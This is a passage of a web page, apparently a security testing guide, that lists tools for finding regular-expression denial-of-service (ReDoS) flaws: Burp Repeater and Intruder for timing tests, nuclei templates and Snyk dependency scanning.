  target: _blank
  ---
  Use Repeater to manually test ReDoS payloads and measure response times. Intruder can automate payload length iteration for timing analysis.
  ::

  ::card
  ---
  title: nuclei
  icon: i-lucide-atom
  to: https://github.com/projectdiscovery/nuclei
  target: _blank
  ---
  Template-based scanner with ReDoS detection templates. Can test common ReDoS payloads against discovered input fields at scale.
  ::

  ::card
  ---
  title: Snyk
  icon: i-lucide-package
  to: https://snyk.io/
  target: _blank
  ---
  Dependency vulnerability scanner that detects known ReDoS vulnerabilities in third-party packages (npm, pip, Maven, etc.).
  ::
::